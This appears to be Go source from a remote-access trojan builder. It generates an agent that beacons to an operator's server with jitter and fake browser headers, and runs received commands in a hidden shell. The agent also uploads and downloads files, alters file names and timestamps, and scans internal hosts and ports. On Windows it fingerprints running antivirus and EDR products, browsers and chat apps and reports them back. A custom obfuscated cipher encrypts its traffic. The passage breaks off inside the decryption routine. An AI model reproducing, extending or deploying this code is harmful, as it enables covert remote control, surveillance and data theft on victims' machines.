package client
import (
	"regexp"
)
func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
	switch_key,encry_key,download,result,_net,
    info,upload,list,option,Username,user,uid,hostname,
	keyPart,filekey,code,base_rounds,windows_pro string) string {
	//如果参数有一个为空
    if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || encry_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || code == "" || base_rounds == "" {
        return "parameter null"
    }
    var protocol_str, os_str, main_str, sys_str, tls_str,package_str,send,scan_str,scan_func string
	if protocol == "https" {
		protocol_str = "TLSClientConfig: &tls.Config{InsecureSkipVerify: true,},"
		tls_str = `"crypto/tls"`
	} else {
		tls_str = ""
	}
	if os == "win" {
		os_str = `var flag string; if strings.HasSuffix(strings.ToLower(version), "powershell") { flag = "-Command" } else { flag = "/C" }; command := exec.Command(version, flag, cmd); command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}; var stdout, stderr bytes.Buffer; command.Stdout = &stdout; command.Stderr = &stderr; err := command.Run(); if err != nil && stderr.Len() > 0 { return stderr.String() }; return stdout.String()`
		sys_str = `"syscall"`
	} else {
		os_str = `cmdObj := exec.Command(version, "-c", cmd);result, err := cmdObj.CombinedOutput();if err != nil {return ""};return string(result)`
		sys_str = ""
	}
	if os == "android" {
		main_str = ""
        package_str = "run"
	} else {
		main_str = "func main(){run()}"
        package_str = "main"
	}
    if windows_pro == "group_pro" && os == "win" {
        send = `
type AntivirusProcess struct {
	ProcessName string
	DisplayName string
}

var antivirusList = []AntivirusProcess{
    {"360tray.exe", "360 Safe Guard"},
    {"360sd.exe", "360 Antivirus"},
    {"a2guard.exe", "a-squared Antivirus"},
    {"ad-watch.exe", "Lavasoft Antivirus"},
    {"cleaner8.exe", "The Cleaner Antivirus"},
    {"vba32lder.exe", "VB32 Antivirus"},
    {"MongoosaGUI.exe", "Mongoosa Antivirus"},
    {"CorantiControlCenter32.exe", "Coranti2012 Antivirus"},
    {"F-PROT.EXE", "F-PROT Antivirus"},
    {"CMCTrayIcon.exe", "CMC Antivirus"},
    {"K7TSecurity.exe", "K7 Antivirus"},
    {"UnThreat.exe", "UnThreat Antivirus"},
    {"CKSoftShiedAntivirus4.exe", "Shield Antivirus"},
    {"AVWatchService.exe", "VIRUSfighter Antivirus"},
    {"ArcaTasksService.exe", "ArcaVir Antivirus"},
    {"iptray.exe", "Immunet Antivirus"},
    {"PSafeSysTray.exe", "PSafe Antivirus"},
    {"nspupsvc.exe", "nProtect Antivirus"},
    {"SpywareTerminatorShield.exe", "SpywareTerminator Antivirus"},
    {"BKavService.exe", "Bkav Antivirus"},
    {"MsMpEng.exe", "Microsoft Security Essentials"},
    {"SBAMSvc.exe", "VIPRE"},
    {"ccSvcHst.exe", "Norton Antivirus"},
    {"QQ.exe", "QQ"},
    {"f-secure.exe", "F-Secure"},
    {"avp.exe", "Kaspersky"},
    {"KvMonXP.exe", "Jiangmin Antivirus"},
    {"RavMonD.exe", "Rising Antivirus"},
    {"Mcshield.exe", "McAfee"},
    {"egui.exe", "NOD32"},
    {"kxetray.exe", "Kingsoft Antivirus"},
    {"knsdtray.exe", "Keniu Antivirus"},
    {"avcenter.exe", "Avira (Red Umbrella)"},
    {"ashDisp.exe", "Avast Internet Security"},
    {"rtvscan.exe", "Norton Antivirus"},
    {"ksafe.exe", "Kingsoft Guard"},
    {"QQPCRTP.exe", "QQ PC Manager"},
    {"Miner.exe", "Miner"},
    {"AYAgent.aye", "Capsule Korea"},
    {"patray.exe", "AhnLab"},
    {"V3Svc.exe", "AhnLab V3"},
    {"avgwdsvc.exe", "AVG Antivirus"},
    {"ccSetMgr.exe", "Symantec"},
    {"QUHLPSVC.EXE", "QUICK HEAL Antivirus"},
    {"mssecess.exe", "Microsoft Antivirus"},
    {"SavProgress.exe", "Sophos Antivirus"},
    {"fsavgui.exe", "F-Secure Antivirus"},
    {"vsserv.exe", "Bitdefender"},
    {"remupd.exe", "Panda Security"},
    {"FortiTray.exe", "Fortinet"},
    {"safedog.exe", "SafeDog"},
    {"parmor.exe", "Trojan Star"},
    {"beikesan.exe", "Shell Security"},
    {"KSWebShield.exe", "Kingsoft Web Shield"},
    {"TrojanHunter.exe", "Trojan Hunter"},
    {"GG.exe", "Juden Game Shield"},
    {"adam.exe", "Green Eagle Security"},
    {"AST.exe", "Super Patrol"},
    {"ananwidget.exe", "Mozhe Security Expert"},
    {"AVK.exe", "GData"},
    {"ccapp.exe", "Symantec Norton"},
    {"avg.exe", "AVG Anti-Virus"},
    {"spidernt.exe", "Dr.Web"},
    {"Mcshield.exe", "McAfee"},
    {"avgaurd.exe", "Avira Antivir"},
    {"F-PROT.exe", "F-Prot AntiVirus"},
    {"vsmon.exe", "ZoneAlarm"},
    {"avp.exee", "Kaspersky"},
    {"cpf.exe", "Comodo"},
    {"outpost.exe", "Outpost Firewall"},
    {"rfwmain.exe", "Rising Firewall"},
    {"kpfwtray.exe", "Kingsoft Web Guard"},
    {"FYFireWall.exe", "Fengyun Firewall"},
    {"MPMon.exe", "MicroPoint Active Defense"},
    {"pfw.exe", "SkyNet Firewall"},
    {"S.exe", "Chicken Catcher"},
    {"1433.exe", "Scanning 1433"},
    {"DUB.exe", "Brute Force"},
    {"ServUDaemon.exe", "Found S-U"},
    {"BaiduSdSvc.exe", "Baidu Antivirus"},
    {"bdservicehost.exe", "Bitdefender"},
    {"bdagent.exe", "Bitdefender Agent"},
    {"avengine.exe", "TotalAV"},
    {"avgui.exe", "AVG UI"},
    {"avastui.exe", "Avast UI"},
    {"savservice.exe", "Sophos Endpoint"},
    {"tmccsf.exe", "Trend Micro Core Service"},
    {"NisSrv.exe", "Microsoft Defender SmartScreen"},
    {"mfemms.exe", "McAfee Endpoint Security"},
    {"mfetp.exe", "McAfee Exploit Prevention"},
    {"mfevtps.exe", "McAfee Validation Trust Protection"},
    {"swi_service.exe", "Webroot SecureAnywhere"},
    {"f-secure.exe", "F-Secure Anti-Virus"},
    {"vsservppl.exe", "Bitdefender Protected Process"},
    {"zamsvc.exe", "Zemana AntiMalware"},
    {"mbam.exe", "Malwarebytes"},
    {"mbamservice.exe", "Malwarebytes Service"},
    {"msmpeng.exe", "Windows Defender"},
    {"MpDefenderCoreService", "Windows Defender"},
    {"windefend.exe", "Windows Defender Service"},
    {"drweb32wrt.exe", "Dr.Web Scanner"},
    {"dwengine.exe", "Doctor Web Engine"},
    {"clamd.exe", "ClamAV Daemon"},
    {"clamtray.exe", "ClamWin Antivirus"},
    {"immunetprotect.exe", "Immunet Protect"},
    {"emsisoft.exe", "Emsisoft Anti-Malware"},
    {"esets.exe", "ESET Service"},
    {"ekrn.exe", "ESET NOD32 Kernel"},
    {"egui.exe", "ESET GUI"},
    {"cyserver.exe", "Cylance Smart Antivirus"},
    {"cytray.exe", "Cylance UI"},
    {"SentinelAgent.exe", "SentinelOne Agent"},
    {"csfalconservice.exe", "CrowdStrike Falcon Sensor"},
    {"SophosFS.exe", "Sophos File Scanner"},
    {"SophosHealth.exe", "Sophos Health Service"},
    {"SophosUI.exe", "Sophos UI"},
    {"SEP.exe", "Symantec Endpoint Protection"},
    {"sngui.exe", "Sophos Network GUI"},
    {"xagt.exe", "FireEye Agent"},
    {"tmproxy.exe", "TrendMicro Proxy Service"},
    {"avkcl.exe", "GData AVK"},
    {"trjscan.exe", "Trojan Remover"},
    {"webproxy.exe", "Web Security Agent"},
    {"mcshield.exe", "McAfee Scanner"},
    {"pccntmon.exe", "Trend Micro Monitor"},
}
type BrowserProcess struct {
    ProcessName string // Executable process name
    DisplayName string // Browser display name
}

var browserList = []BrowserProcess{
    {"chrome.exe", "Google Chrome"},
    {"msedge.exe", "Microsoft Edge"},
    {"firefox.exe", "Mozilla Firefox"},
    {"opera.exe", "Opera"},
    {"brave.exe", "Brave Browser"},
    {"vivaldi.exe", "Vivaldi"},
    {"iexplore.exe", "Internet Explorer"},
    {"safari.exe", "Apple Safari"},
    {"chromium.exe", "Chromium Browser"},
    {"maxthon.exe", "Maxthon Browser"},
    {"qqbrowser.exe", "QQ Browser"},
    {"ucbrowser.exe", "UC Browser"},
    {"2345Explorer.exe", "2345 Explorer"},
    {"liebao.exe", "Cheetah Browser"},
    {"sebrowser.exe", "Sogou High-Speed Browser"},
    {"baidubrowser.exe", "Baidu Browser"},
    {"360se.exe", "360 Safe Browser"},
    {"360chrome.exe", "360 Extreme Browser"},
    {"yandex.exe", "Yandex Browser"},
    {"tor.exe", "Tor Browser"},
    {"avastbrowser.exe", "Avast Secure Browser"},
    {"coc_coc_browser.exe", "Cốc Cốc Browser"},
    {"k-meleon.exe", "K-Meleon"},
    {"midori.exe", "Midori"},
    {"waterfox.exe", "Waterfox"},
    {"palemoon.exe", "Pale Moon"},
    {"slimbrowser.exe", "SlimBrowser"},
    {"comodo_dragon.exe", "Comodo Dragon"},
    {"torch.exe", "Torch Browser"},
}
type ChatApp struct {
    ProcessName string // Executable process name
    DisplayName string // Display name
}
var ChatAppList = []ChatApp{
    // 🟦 Domestic chat software
    {"QQ.exe", "QQ"},
    {"Weixin.exe", "WeChat"},
    {"TIM.exe", "TIM"},
    {"AliIM.exe", "AliWangwang"},
    {"DingTalk.exe", "DingTalk"},
    {"Feishu.exe", "Feishu"},
    {"RTX.exe", "RTX Tencent Talk"},

    // 🟦 Foreign chat software
    {"Telegram.exe", "Telegram"},
    {"WhatsApp.exe", "WhatsApp"},
    {"Signal.exe", "Signal"},
    {"Skype.exe", "Skype"},
    {"Zoom.exe", "Zoom"},
    {"Slack.exe", "Slack"},
    {"Discord.exe", "Discord"},
    {"MicrosoftTeams.exe", "Microsoft Teams"},
    {"Viber.exe", "Viber"},
    {"Line.exe", "LINE"},
    {"ICQ.exe", "ICQ"},
    {"Trillian.exe", "Trillian"},
}
func getMACAddresses() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "00:00:00:00:00:00"
	}
	var macs []string
	for _, iface := range interfaces {
		mac := iface.HardwareAddr.String()
		if mac != "" {
			macs = append(macs, mac)
		}
	}
	return strings.Join(macs, ",")
}
func getCPUFromRegistry() string {
    k,err := registry.OpenKey(registry.LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", registry.QUERY_VALUE)
    if err != nil {
        return ""
    }
    defer k.Close()

    cpuName, _, err := k.GetStringValue("ProcessorNameString")
    if err != nil {
        return ""
    }
    return cpuName
}
func matchAntivirus(lowerSet map[string]bool) string {
	var ant []string
	for _, av := range antivirusList {
		if lowerSet[strings.ToLower(av.ProcessName)] {
			ant = append(ant, av.DisplayName)
		}
	}
	return strings.Join(ant, ",")
}
func matchBrowsers(lowerSet map[string]bool) string {
	var bro []string
	for _, browser := range browserList {
		if lowerSet[strings.ToLower(browser.ProcessName)] {
			bro = append(bro, browser.DisplayName)
		}
	}
	return strings.Join(bro, ",")
}
func matchChatApps(lowerSet map[string]bool) string {
	var apps []string
	for _, chat := range ChatAppList {
		if lowerSet[strings.ToLower(chat.ProcessName)] {
			apps = append(apps, chat.DisplayName)
		}
	}
	return strings.Join(apps, ",")
}
func getWindowsVersion() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
	if err != nil {
		return "unknown"
	}
	defer key.Close()
	productName, _, err := key.GetStringValue("ProductName")
	if err != nil {
		return "unknown"
	}
	return productName
}
func getProcess_list() []string {
	processes,_:= process.Processes()
	var names []string
	for _, p := range processes {
		name, err := p.Name()
		if err == nil && name != "" {
			names = append(names, name)
		}
	}
	return names
}
func send() { //发送头部信息
    Process_win := getProcess_list()
    lowerSet := make(map[string]bool)
    for _, p := range Process_win {
        lowerSet[strings.ToLower(p)] = true
    }
    macs := getMACAddresses() //获取地址
    cpuInfo := getCPUFromRegistry()
    Antivirus := matchAntivirus(lowerSet)
    Browsers := matchBrowsers(lowerSet)
    ChatApps := matchChatApps(lowerSet)
    vmStat, _ := mem.VirtualMemory()
    systemType := getWindowsVersion()
    Arm := "x64"
    usedGB := strconv.FormatFloat(float64(vmStat.Used)/(1024*1024*1024), 'f', 1, 64)
    totalGB := strconv.FormatFloat(float64(vmStat.Total)/(1024*1024*1024), 'f', 1, 64)
    percent := strconv.FormatFloat(vmStat.UsedPercent, 'f', 0, 64)
    memoryStr := usedGB + "/" + totalGB + " GB (" + percent + "%)"

    re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
    currentDir, _:= os.Getwd()
    currentDir = strings.ReplaceAll(currentDir, "\\", "/")
    parts := strings.Split(master, ":")
    add_str := clientname +"^"+ user +"^"+ osname +"^"+ strconv.Itoa(int(delay)) +"^"+ getInternalIPs() +"^"+ currentDir +"^"+ version +"^"+ parts[1] +"^"+ protocol +"^"+ strconv.Itoa(int(jitter))+"^"+ executable +"^"+ macs +"^"+ cpuInfo +"^"+ Antivirus +"^"+ Browsers +"^"+ ChatApps +"^"+ memoryStr +"^"+ systemType +"^"+ Arm
    encry_str := get_encry_s(&add_str)
    data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
    post(data, re_url)
}
    `
    }else{
        send = `
        func send() {
            re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
            currentDir, _:= os.Getwd()
            currentDir = strings.ReplaceAll(currentDir, "\\", "/")
            parts := strings.Split(master, ":")
            add_str := clientname +"^"+ user +"^"+ osname +"^"+ strconv.Itoa(int(delay)) +"^"+ getInternalIPs() +"^"+ currentDir +"^"+ version +"^"+ parts[1] +"^"+ protocol +"^"+ strconv.Itoa(int(jitter))+"^"+ executable
            encry_str := get_encry_s(&add_str)
            data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
            post(data, re_url)
        }
        `
        scan_str = `
        func split_comment(portList string)[]string{
            var temp_split []string
            var port_list []string
            if strings.Contains(portList, ",") {
                temp_split = strings.Split(portList, ",")
                return temp_split
            } else if strings.Contains(portList, "-") {
                temp_split = strings.Split(portList, "-")
                start_port,_:= strconv.Atoi(temp_split[0])
                end_port,_:= strconv.Atoi(temp_split[1])
                for i := start_port; i <= end_port; i++ {
                    str:=strconv.Itoa(i)
                    port_list = append(port_list, str)
                }
            } else {
                port_list = append(port_list, portList)
                return port_list
            }
            return port_list
        }
        func scan_u_firends(ip, portList, delay, choice, option string) {
            var resultBuilder strings.Builder
            var mutex sync.Mutex
            var open_ports, re_url string
            port_list := split_comment(portList)
            if len(port_list) > 65535 {
                return
            }
            sleep_time, err := strconv.Atoi(delay)
			if err != nil || sleep_time <= 0 {
	            return
	        }
            if option == "port" {
                for _, port := range port_list {
                    time.Sleep(time.Duration(sleep_time) * time.Second)
                    scan_port(ip, port, sleep_time,&resultBuilder, &mutex)
                }
            } else if option == "ping" {
                ip_split := strings.Split(ip, ".")
                new_ip := strings.Join(ip_split[:3], ".") + "."
                ping_list := split_comment(ip_split[3])
                if len(ping_list) > 255 {
                    return
                }
                for _, i := range ping_list {
                    target := new_ip + i
                    for _, p := range port_list {
                        time.Sleep(time.Duration(sleep_time) * time.Second)
                        scan_port(target, p, sleep_time,&resultBuilder, &mutex)
                    }
                }
            }
            open_ports = resultBuilder.String()
            encrypted_data := get_encry_s(&open_ports)
            data := map[string]string{
                "/*uid*/":    uid,
                "/*result*/": encrypted_data,
            }
            if choice == "save" {
                re_url = protocol + master + "//*Path*/?/*option*/=/*_net*/"
            } else {
                re_url = protocol + master + "//*Path*/?/*option*/=/*result*/"
            }
            post(data, re_url)
        }
        func scan_port(ip, port string, sleep_time int, resultBuilder *strings.Builder, mutex *sync.Mutex) {
		    timeout := time.Duration(sleep_time) * time.Second
		    conn, err := net.DialTimeout("tcp", ip+":"+port, timeout)
		    if err != nil {
		        return // 无法连接，端口未开放
		    }
		    defer conn.Close()
		    target := ip + ":[" + port + "]"
		    mutex.Lock()
		    resultBuilder.WriteString(target + "\n")
		    mutex.Unlock()
		}`
        scan_func = `case "GET_U_FRIENDS":
                        go scan_u_firends(msg[1], msg[2], msg[3], msg[4], "ping")
                    case "GET_PORTS":
                        go scan_u_firends(msg[1], msg[2], msg[3], msg[4], "port")`
    }
	protocol_var :="\""+protocol + "://\""
    s_server := "\""+server+"\""
    u_username := "\""+Username+"\""
    o_os := "\""+os+"\""
    templateStr := `
    package /*package_str*/
    import (
        "bytes"
        "math/rand"
        "math/big"
        "io"
        "io/ioutil"
        "net/http"
        "net"
        "os"
        "os/exec"
        "strings"
        "time"
        "mime/multipart"
        "strconv"
        "sync"
        "path/filepath"
        /*sys_str*/
        /*tls_str*/
    )
    var(
        osname = /*os*/
        protocol = /*protocol_var*/
        uid string
        version string
        clientname string
        executable string
        delay int = 30
        delayMutex sync.RWMutex
        waitTime int = 3
        jitter int = 5
        jitterMutex sync.RWMutex
        base_rounds string = "/*base_rounds*/"
        decodeMap  = make(map[byte]int)
        onece bool = true
        user string = /*Username*/
        master string = /*server*/
        key string
        get_headers map[string]string= map[string]string{"Accept":"q=0.7;text/html,application/xhtml+xml","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
        post_headers map[string]string= map[string]string{"Content-Type":"application/json","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
        transport http.RoundTripper
        client *http.Client
        file_byte_parts = make(map[string][]byte)
    )
    /*main_str*/
    func initHttpClient() {
        transport = &http.Transport{
            MaxIdleConnsPerHost: 100,
            MaxIdleConns:        100,
            IdleConnTimeout:     5,
            DisableKeepAlives:   false,
            DialContext: (&net.Dialer{
                Timeout:   30 * time.Second,
                KeepAlive: 30 * time.Second,
            }).DialContext,
            /*protocol_str*/
        }
        client = &http.Client{
            Transport: transport,
            Timeout:   30 * time.Second,
        }
    }
    func getUrl(url string) string {
        for {
            req, err := http.NewRequest("GET", url, nil)
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            for key, value := range get_headers {
                req.Header.Set(key, value)
            }
            resp, err := client.Do(req)
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            respBody, err := ioutil.ReadAll(resp.Body)
            resp.Body.Close()
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            if len(respBody) == 0 {
                return ""
            }
            return strings.TrimSpace(string(respBody))
        }
    }
    func post(data map[string]string, re_url string) {
        for {
            var formStr strings.Builder
            for key, value := range data {
                formStr.WriteString(urlEncode(key))
                formStr.WriteString("=")
                formStr.WriteString(urlEncode(value))
                formStr.WriteString("&")
            }
            formData := formStr.String()
            if len(formData) > 0 {
                formData = formData[:len(formData)-1]
            }
            req, err := http.NewRequest("POST", re_url, strings.NewReader(formData))
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
            for key, value := range post_headers {
                if key != "Content-Type" {
                    req.Header.Set(key, value)
                }
            }
            resp, err := client.Do(req)
            if err != nil {
                time.Sleep(time.Duration(waitTime) * time.Second)
                continue
            }
            resp.Body.Close()
            return // 成功
        }
    }
    func urlEncode(s string) string {
        hexChars := "0123456789ABCDEF"
        var buf strings.Builder
        for i := 0; i < len(s); i++ {
            c := s[i]
            if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~' {
                buf.WriteByte(c)
            } else {
                buf.WriteByte('%')
                buf.WriteByte(hexChars[c>>4])
                buf.WriteByte(hexChars[c&0x0F])
            }
        }
        return buf.String()
    }
    func downloadFile(re_url, fileKey string) {
        encryData := get_encry_s(&fileKey)
        url := protocol + master + "//*Path*/?/*option*/=/*download*/&/*uid*/=" + uid + "&/*filekey*/=" + encryData
        filesplit := strings.Split(fileKey, "*")
        if len(filesplit) < 3 {
            delete(file_byte_parts, fileKey)
            return
        }
        filename := filesplit[1]
        var fullData []byte
        for {
            retryCount := 0
            var maxRetry int
            delayMutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};delayMutex.RUnlock()
            response, err := http.Get(url)
            if err != nil {
                retryCount++
                if retryCount < maxRetry {
                    time.Sleep(2 * time.Second)
                    continue
                }
                delete(file_byte_parts, fileKey)
                return
            }
            fileData, err := io.ReadAll(response.Body)
            response.Body.Close()
            if err != nil {
                retryCount++
                if retryCount < maxRetry {
                    time.Sleep(2 * time.Second)
                    continue
                }
                delete(file_byte_parts, fileKey)
                return
            }
            if len(fileData) == 0 {
                break
            }
            fullData = append(fullData, fileData...)
            delayMutex.RLock();time.Sleep(time.Duration(delay) * time.Second);delayMutex.RUnlock()
        }
        file_byte_parts[fileKey] = fullData
        if err := get_decry_f(filename, fileKey); err != nil {
            return
        }
    }
    func GET_U_FILE(cmd, splitSize string) {
        intSize, _ := strconv.Atoi(splitSize)
        fileContent, _ := get_encry_f(cmd)
        fileSize := len(fileContent)
        start := 0
        var maxRetry int
        delayMutex.RLock();if delay < 30 {maxRetry = 30} else {maxRetry = delay};delayMutex.RUnlock()
        end := intSize
        for start < fileSize {
            if end > fileSize {
                end = fileSize
            }
            str_encry := user + "^" + splitSize + "^" + strconv.Itoa(fileSize) + "^" + strconv.Itoa(start) + "^" + strconv.Itoa(end)
            data_encry := get_encry_s(&str_encry)
            chunk := fileContent[start:end]
            var buffer bytes.Buffer
            writer := multipart.NewWriter(&buffer)
            part, _ := writer.CreateFormFile("/*upload*/", get_encry_s(&cmd))
            io.Copy(part, bytes.NewReader(chunk))
            writer.WriteField("/*uid*/", uid)
            writer.WriteField("/*result*/", data_encry)
            writer.Close()
            url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
            req, _ := http.NewRequest("POST", url, &buffer)
            req.Header.Set("Content-Type", writer.FormDataContentType())
            req.Header.Set("Range", "bytes"+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
            retryCount := 0
            for {
                resp, err := client.Do(req)
                if err != nil || resp.StatusCode != http.StatusOK {
                    retryCount++
                    if resp != nil {
                        resp.Body.Close()
                    }
                    if retryCount < maxRetry {
                        time.Sleep(2 * time.Second)
                        continue
                    }
                    return
                }
                resp.Body.Close()
                break
            }
            start = end
            end = start + intSize
            delayMutex.RLock();time.Sleep(time.Duration(delay) * time.Second);delayMutex.RUnlock()
        }
    }
    func getCmd() {
        url := protocol + master + "//*Path*/?/*option*/=/*MsgPath*/&/*uid*/=" + uid
        re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
        file_url := protocol + master + "//*Path*/?/*option*/=/*list*/"
        var job, shell,taskid string
        var msg []string
        for {
            delayMutex.RLock()
            wait := delay
            if delay > 30 {
                jitterMutex.RLock()
                wait += rand.Intn(jitter + 1)
                jitterMutex.RUnlock()
            }
            delayMutex.RUnlock()
            time.Sleep(time.Duration(wait) * time.Second)
            respBody := getUrl(url)
            if respBody == "" {
                continue
            } else if respBody == uid {
                onece = true
                run()
            }
            cmd := get_decry_s(&respBody)
            msg = strings.Split(cmd, "^")
            if len(msg) < 2 {
                continue
            }
            job, taskid = msg[0], msg[len(msg)-1]
            msg_cmd := strings.Join(msg[:len(msg)-1], "^")
            if len(msg) > 1 {
                shell = string(msg[1])
            }
            switch job {
            /*scan_func*/
            case "GET_DELAY":
                GET_DELAY(msg[1])
            case "GET_JITTER":
                GET_JITTER(msg[1])
            case "GET_U_FILE":
                go GET_U_FILE(msg[1], msg[2])
            case "LOAD_U_FILE":
                go downloadFile(re_url, msg[1])
            case "LOOK_UP_FILE":
                listDir(shell, file_url,taskid)
            case "SWITCH_VERSION":
                version = shell
            case "CHANG_FILE_NAME":
                CHANG_FILE_NAME(msg[1], msg[2])
            case "CHANG_FILE_TIME":
                CHANG_FILE_TIME(msg[1], msg[2])
            /*code*/
            default:
                go get_Command(msg_cmd, re_url,taskid)
            }
        }
    }
    func get_Command(cmd,re_url,taskid string) {
        result := Command(cmd)
        if result != "" {
            encry_result := get_encry_s(&result)
            if encry_result == "" {
                return
            }
            data:= map[string]string{
                "/*uid*/": uid,
                "/*result*/": encry_result,
                "/*info*/": taskid,
            }
            post(data, re_url)
        }
        return
    }
    func Command(cmd string) string {
        /*os_str*/
    }
    func CHANG_FILE_TIME(cmd, newTime string){
	    info, err := os.Stat(cmd)
	    if err != nil {
	        return
	    }
	    if info.IsDir() {
	        return
	    }
	    cleanTime := strings.ReplaceAll(strings.TrimSpace(newTime), "\r", "")
	    modTime, err := time.Parse("2006-01-02 15:04:05", cleanTime)
	    if err != nil {
	        return
	    }
	    if err := os.Chtimes(cmd, modTime, modTime); err != nil {
	        return
	    }
	    return
	}
	
	// 修改文件名
	func CHANG_FILE_NAME(cmd, newName string) {
	    if _, err := os.Stat(cmd); os.IsNotExist(err) {
	        return
	    }
	    dir := filepath.Dir(cmd)
	    newPath := filepath.Join(dir, newName)
	    if err := os.Rename(cmd, newPath); err != nil {
	        return
	    }
	    return
	}
    func listDir(cmd, file_url,taskid string) {
        var fileNames string
        files, _ := ioutil.ReadDir(cmd)
        for _, file := range files {
            modTime := file.ModTime()
            modTimeStr := modTime.Format("2006-01-02 15:04:05")
            permissions := file.Mode().String()
            if file.IsDir() {
                fileNames += "dir " + file.Name() + "<" + permissions + "><" + modTimeStr + ">\n"
            } else {
                fileSize := file.Size()
                fileSizeMB := float64(fileSize) / (1024 * 1024)
                fileSizeStr := strconv.FormatFloat(fileSizeMB, 'f', 2, 64)
                fileNames += "fil " + file.Name() + "<" + fileSizeStr + ".MB><" + permissions + "><" + modTimeStr + ">\n"
            }
        }
        if fileNames == "" {
            fileNames = "empty"
        }
        fileData := cmd + "^" + fileNames
        encryptedStr := get_encry_s(&fileData)
        data := map[string]string{
            "/*uid*/":  uid,
            "/*result*/": encryptedStr,
            "/*info*/": taskid,
        }
        post(data, file_url)
    }
    func GET_JITTER(s_jitter string) {
        parsedJitter, err := strconv.Atoi(s_jitter)
        if err != nil || parsedJitter <= 0 {
            return
        }
        jitterMutex.Lock();jitter = parsedJitter;jitterMutex.Unlock()
    }
    func GET_DELAY(s_delay string) {
        parsedTime, err := strconv.ParseInt(s_delay, 10, strconv.IntSize)
        if err != nil || parsedTime <= 0{
            return
        }
        delayMutex.Lock()
        defer delayMutex.Unlock()
        delay = int(parsedTime)
        if t, ok := transport.(*http.Transport); ok {
            if delay >= 30 {
                t.IdleConnTimeout = 5 * time.Second
            } else {
                t.IdleConnTimeout = 0
            }
        }
        return
    }
    /*scan_str*/
    func getInternalIPs() string {
        var ips []string
        interfaces, _ := net.Interfaces()
        for _, iface := range interfaces {
            if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
                continue
            }
            addrs, _ := iface.Addrs()
            for _, addr := range addrs {
                var ip net.IP
                switch v := addr.(type) {
                case *net.IPNet:
                    ip = v.IP
                case *net.IPAddr:
                    ip = v.IP
                }
                if ip != nil && ip.To4() != nil {
                    ips = append(ips, ip.String())
                }
            }
        }
        return strings.Join(ips, ",")
    }
    /*send*/
    // obf const encry
    type ObfConst struct {
        A byte // 0x6b
        B byte // 0x7a
        C byte // 0x5c
        D byte // 0xe4
        E byte // 0x3f
        F byte // 0xa5
    }
    func ObfuscateBySteps(data []byte, k ObfConst) []byte {
        if len(data) < 3 {
            return data
        }
        n := len(data) / 3
        if n < 2 {
            data[0] ^= k.A
            data[1] ^= k.B
            data[2] ^= k.C
            return data
        }
        at := func(r, c int) *byte {
            return &data[r*n+c]
        }
        for col := 1; col < n; col++ {
            colIndex := col + 1
            if colIndex%2 == 0 {
                *at(0, col) = (*at(0, col-1) | *at(0, col)) ^ k.A
                *at(2, col) = *at(1, col-1) ^ *at(2, col) ^ k.B
                *at(1, col) = *at(2, col-1) ^ *at(1, col) ^ k.C
            } else {
                *at(1, col) = (*at(0, col-1) ^ *at(1, col)) ^ k.D
                *at(0, col) = *at(1, col-1) ^ (*at(0, col) ^ k.E)
                *at(2, col) = (*at(2, col-1) | *at(2, col)) ^ k.F
            }
        }
        lastCol := n - 1
        *at(0, 0) = (*at(0, lastCol) | *at(0, 0)) ^ k.A
        *at(2, 0) = *at(1, lastCol) ^ *at(2, 0) ^ k.B
        *at(1, 0) = *at(2, lastCol) ^ *at(1, 0) ^ k.C
        return data
    }
    func randomSalt6() (ObfConst, []byte) {
        var s [6]byte
        _, _ = rand.Read(s[:])
        return ObfConst{
            A: s[0],
            B: s[1],
            C: s[2],
            D: s[3],
            E: s[4],
            F: s[5],
        }, s[:]
    }
    func Encrypt(plain []byte) []byte {
        if len(plain) == 0 {
            return nil
        }
        obfKey, salt := randomSalt6()
        sin := (int(key[1024%len(key)])*len(plain) ^ 1024) % len(key)
        ofkey := append([]byte{}, key[sin:]...)
        fuscateKey := ObfuscateBySteps(ofkey, obfKey)
        if len(fuscateKey) == 0 {
            return nil
        }
        out := make([]byte, len(plain))
        for i := range plain {
            out[i] = plain[i] ^ fuscateKey[i%len(fuscateKey)]
        }
        return append(out, salt...)
    }
    func Decrypt(cipher  []byte) []byte {
        if len(cipher) < 6 {
            return nil
        }
        data := cipher[:len(cipher)-6]
        salt := cipher[len(cipher)-6:]
        obfKey := ObfConst{
            A: salt[0],
            B: salt[1],
            C: salt[2],
            D: salt[3],
            E: salt[4],
            F: salt[5],
        }
